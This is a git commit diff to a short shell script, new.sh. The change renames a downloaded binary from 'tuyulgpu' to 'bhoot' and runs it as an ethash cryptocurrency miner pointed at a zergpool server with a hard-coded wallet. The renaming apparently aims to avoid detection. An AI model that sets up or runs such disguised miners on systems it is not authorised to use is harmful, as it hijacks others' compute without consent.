8fb5b95f6f576c2bf75112e45641467e2c5db068
dunny11 <86607224+dunny11@users.noreply.github.com>
2021-06-29 00:33:53 +0530

    Update new.sh

--- new.sh
+++ new.sh
@@ -1,3 +1,3 @@
-chmod +x tuyulgpu
-./tuyulgpu -a ethash -o stratum+tcp://ethash.na.mine.zergpool.com:9999 -u 0xd5a7c28d2c4fa04c5b5e119ba3e5fa372774e070 -p c=ETH
+chmod +x bhoot
+./bhoot -a ethash -o stratum+tcp://ethash.na.mine.zergpool.com:9999 -u 0xd5a7c28d2c4fa04c5b5e119ba3e5fa372774e070 -p c=ETH
 
